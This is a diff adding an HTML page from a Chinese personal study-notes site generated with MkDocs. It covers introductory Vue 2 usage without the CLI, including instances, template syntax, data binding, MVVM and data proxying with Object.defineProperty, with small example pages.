@@ -1,0 +1,3674 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../java%E5%AD%A6%E4%B9%A0/%E5%AE%89%E8%A3%85elasticsearch/">
+      
+      
+        <link rel="next" href="../Vue%EF%BC%88%E8%84%9A%E6%89%8B%E6%9E%B6%EF%BC%89/">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.3">
+    
+    
+      
+        <title>Vue（非脚手架） - Serendipity_Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.c4a75a56.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.a0c5b2b5.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#vue" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="Serendipity_Docs" class="md-header__button md-logo" aria-label="Serendipity_Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Serendipity_Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Vue（非脚手架）
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Serendipity_Docs" class="md-nav__button md-logo" aria-label="Serendipity_Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Serendipity_Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        主页
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+          数据结构和算法
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          数据结构和算法
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/" class="md-nav__link">
+        数据结构和算法
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        算法总结
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/" class="md-nav__link">
+        动态规划
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          java学习
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          java学习
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../java%E5%AD%A6%E4%B9%A0/%E5%BE%AE%E6%9C%8D%E5%8A%A1/" class="md-nav__link">
+        微服务
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../java%E5%AD%A6%E4%B9%A0/Centos7%E5%AE%89%E8%A3%85Docker/" class="md-nav__link">
+        Centos7安装Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../java%E5%AD%A6%E4%B9%A0/Docker%E5%91%BD%E4%BB%A4/" class="md-nav__link">
+        Docker命令
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../java%E5%AD%A6%E4%B9%A0/MyBatis-Plus/" class="md-nav__link">
+        MyBatis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../java%E5%AD%A6%E4%B9%A0/nacos%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/" class="md-nav__link">
+        nacos集群搭建
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../java%E5%AD%A6%E4%B9%A0/RabbitMQ%E9%83%A8%E7%BD%B2%E6%8C%87%E5%8D%97/" class="md-nav__link">
+        RabbitMQ部署指南
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../java%E5%AD%A6%E4%B9%A0/Redis7/" class="md-nav__link">
+        Redis7
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../java%E5%AD%A6%E4%B9%A0/Spring6/" class="md-nav__link">
+        Spring6
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../java%E5%AD%A6%E4%B9%A0/SpringBoot/" class="md-nav__link">
+        SpringBoot
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../java%E5%AD%A6%E4%B9%A0/%E5%AE%89%E8%A3%85elasticsearch/" class="md-nav__link">
+        安装elasticsearch
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          前端学习
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          前端学习
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Vue（非脚手架）
+      </a>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Vue%EF%BC%88%E8%84%9A%E6%89%8B%E6%9E%B6%EF%BC%89/" class="md-nav__link">
+        Vue（脚手架）
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          嵌入式
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          嵌入式
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%B5%8C%E5%85%A5%E5%BC%8F/C51%E5%8D%95%E7%89%87%E6%9C%BA/" class="md-nav__link">
+        C51单片机
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+          考研
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          考研
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E8%80%83%E7%A0%94/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" class="md-nav__link">
+        计算机网络
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E8%80%83%E7%A0%94/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/" class="md-nav__link">
+        计算机组成原理
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="vue">Vue（非脚手架）</h1>
+<h1 id="vue_1">一、初识Vue</h1>
+<ol>
+<li>想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象:</li>
+<li>root容器里的代码依然符合htm1规范，只不过混入了一些特殊的Vue语法</li>
+<li>root容器里的代码被称为【Vue模板】；</li>
+<li>Vue实例和容器是一一对应的:</li>
+<li><strong>真实开发中只有一个Vue实例</strong>，并且会配合着<strong>组件</strong>一起使用:</li>
+<li>{{xxx}}中的xxx要写<strong>js表达式</strong>，且xxx可以自动读取到data中的所有属性:</li>
+<li>一旦data中的数据发生改变，那么模板中用到该数据的地方也会自动更新;</li>
+</ol>
+<p>注意区分：js表达式 和 js代码（语句）</p>
+<ol>
+<li>表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：<ul>
+<li>a</li>
+<li>a+b</li>
+<li>demo(1)</li>
+<li>x === y ? 'a' : 'b'</li>
+</ul>
+</li>
+<li>js代码（语句）<ul>
+<li>if(){}</li>
+<li>for(){}</li>
+</ul>
+</li>
+</ol>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;initialVue&lt;/title&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+   &lt;div id=&quot;root1&quot;&gt;
+      &lt;h1&gt;Hello, {{name}}, {{add}}&lt;/h1&gt;
+   &lt;/div&gt;
+   &lt;div id=&quot;root2&quot;&gt;
+      &lt;h1&gt;Hello, {{name}}, {{add}}&lt;/h1&gt;
+   &lt;/div&gt;
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      // 阻止 vue 在启动时生成生产提示
+      Vue.config.productionTip = false;
+
+      // 创建vue实例
+      new Vue({
+         el: '#root1',  //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串
+         data: {   //data中用于存储数据，数据供el指定的容器去使用。值我们暂时先写成一个对象
+            name: 'Vue',
+            add: '上海'
+         }
+      });
+      new Vue({
+         el: '#root2',  //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串
+         data: {   //data中用于存储数据，数据供el指定的容器去使用。值我们暂时先写成一个对象
+            name: '信工之星',
+            add: '韶关学院'
+         }
+      });
+   &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h1 id="_1">二、模板语法</h1>
+<p>Vue模板语法有两大类：</p>
+<ol>
+<li>
+<p>插值语法</p>
+<p>功能：用于解析标签体内容</p>
+<p>写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性</p>
+</li>
+<li>
+<p>指令语法：</p>
+<p>功能：用于解析标签（包括：标签属性、标签体内容、绑定事件。。。。。）</p>
+<p>举例：v-bind:href="xx" 或 简写成   :href="xx"，xx同样要写js表达式，且可以直接读取到data中的所有属性</p>
+<p>备注：Vue中有很多指令，且形式都是：v-???</p>
+</li>
+</ol>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;模板语法&lt;/title&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h1&gt;插值语法&lt;/h1&gt;
+      &lt;h1&gt;你好, {{name}}&lt;/h1&gt;
+      &lt;hr&gt;
+      &lt;a v-bind:href=&quot;school.url.toUpperCase()&quot;&gt;点我去{{school.name}}工作室官网1&lt;/a&gt;
+      &lt;a :href=&quot;school.url&quot;&gt;点我去{{school.name}}工作室官网2&lt;/a&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.productionTip = false;
+
+      new Vue({
+         el: '#root',
+         data: {
+            name: 'jack',
+            school: {
+               url: 'http://xgzx.net.cn',
+               name: '信工之星'
+            }
+
+         }
+      });
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="_2">三、数据绑定</h1>
+<p>Vue中有2种数据绑定的方式:</p>
+<ol>
+<li>
+<p>单向绑定（v-bind）：数据只能从data<strong>流向</strong>页面</p>
+</li>
+<li>
+<p>双向绑定（v-model）：数据不仅能从data流向页面，还可以从页面流向data</p>
+<p>备注：</p>
+<ul>
+<li>双向绑定一般都应用在表单类元素上，如：input、select等</li>
+<li>v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值</li>
+</ul>
+</li>
+</ol>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;数据绑定&lt;/title&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;!-- 普通类写法 --&gt;
+      &lt;!-- 单向数据绑定：&lt;input type=&quot;text&quot; v-bind:value=&quot;name&quot;&gt;&lt;br&gt; --&gt;
+      &lt;!-- v-model只能应用在表单类元素（输入类元素）上 --&gt;
+      &lt;!-- 双向数据绑定：&lt;input type=&quot;text&quot; v-model:value=&quot;name&quot;&gt; --&gt;
+
+      单向数据绑定：&lt;input type=&quot;text&quot; :value=&quot;name&quot;&gt;&lt;br&gt;
+      双向数据绑定：&lt;input type=&quot;text&quot; v-model=&quot;name&quot;&gt;&lt;br&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      new Vue({
+         el: '#root',
+         data: {
+            name: 'xgzx'
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="eldata">四、el与data的两种写法</h1>
+<p>data与el的两种写法：</p>
+<ol>
+<li>
+<p>el有2种写法</p>
+<ul>
+<li>new Vue时候配置el属性</li>
+<li>先创建Vue实例，随后再通过v.$mount('#root')指定</li>
+</ul>
+</li>
+<li>
+<p>data有2中写法</p>
+<ul>
+<li>
+<p>对象式</p>
+</li>
+<li>
+<p>函数式</p>
+<p>如何选择：目前哪种写法都可以，以后学到组件时，data必须使用函数式，否则会报错</p>
+</li>
+</ul>
+</li>
+<li>
+<p>一个重要的原则：</p>
+<p>由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例，而是window</p>
+</li>
+</ol>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;数据绑定&lt;/title&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h1&gt;你好，{{name}}&lt;/h1&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      // el的良好总写法
+      /* const v = new Vue({
+         // el: '#root',   //第一种写法
+         data: {
+            name: 'xgzx'
+         }
+      })
+      console.log(v)
+
+      v.$mount('#root') //第二种写法 */
+      new Vue({
+         el: '#root',
+         /* // data的第一种写法：对象式
+         data: {
+            name: 'xgzx'
+         } */
+
+         // data的第二种写法：函数形式
+         data() {
+            console.log('@@@@', this)  //此处的this是Vue实例对象
+            return {
+               name: 'xgzx'
+            }
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="mvvm">五、MVVM模型</h1>
+<p>MVVM模型：</p>
+<ol>
+<li>M：模型（Model）：data中的数据</li>
+<li>V：视图（View）：模板代码</li>
+<li>VM：视图模型（ViewModel）：Vue实例</li>
+</ol>
+<p>观察发现；</p>
+<ol>
+<li>data中所有的属性，最后都出现在了vm身上</li>
+<li>vm身上所有的属性 以及 Vue原型上所有的属性，在Vue模板中都可以直接使用</li>
+</ol>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;MVVM模型&lt;/title&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h1&gt;学校名称：{{name}}&lt;/h1&gt;
+      &lt;h1&gt;学校地址：{{address}}&lt;/h1&gt;
+      &lt;h1&gt;测试1: {{_c}}&lt;/h1&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      const vm = new Vue({
+        el: '#root',
+        data: {
+         name: '韶关学院123',
+         address: '韶关'
+      }})
+      console.log(vm)
+   &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h1 id="_3">六、数据代理</h1>
+<h2 id="61-objectdefineproperty">6.1 回顾Object.defineProperty方法</h2>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;1.回顾Object.defineProperty方法&lt;/title&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      let number = 19
+      let person = {
+         name: 'John',
+         sex: '男',
+      }
+
+      Object.defineProperty(person, 'age', {
+         // value:18,
+         // enumerable: true,  //控制属性是否可以枚举，默认false
+         // writable: true, //控制属性是否可以被修改，默认false
+         // configurable: true,  //控制属性是否可以被删除，默认false
+
+         // 当有人读取person的age属性时，get函数（getter）就会被调用，且返回值就是age值
+         get() {
+            console.log(&quot;有人读取age属性了&quot;)
+            return number
+         },
+
+         // 当有人修改person的age属性时，set函数（setter）就会被调用，且能读取到修改的值
+         set(value) {
+            console.log(&quot;有人修改了age属性的值,且值是：&quot;, value)
+            number = value
+         }
+
+      })
+      // console.log(Object.keys(person))
+      // for (let key in person) {
+      //    console.log('@',person[key]);
+      // }
+      console.log(person)
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="62">6.2 何为数据代理</h2>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;2.何为数据代理&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写） --&gt;
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      let obj = { x: 100 }
+      let obj2 = { y: 200 }
+
+      Object.defineProperty(obj2, 'x', {
+         get() {
+            return obj.x
+         },
+         set(value) {
+            obj.x = value
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="63-vue">6.3 Vue中的数据代理</h2>
+<p>Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）</p>
+<p>Vue中数据代理的好处：更加方便的操作data中的数据</p>
+<p>基本原理：</p>
+<ol>
+<li>通过Object.defineProperty()把data对象中所有属性添加到vm上</li>
+<li>为每一个添加到vm上的属性，都指定一个getter/setter</li>
+<li>在getter/setter内部去操作（读/写）data中对应的属性</li>
+</ol>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
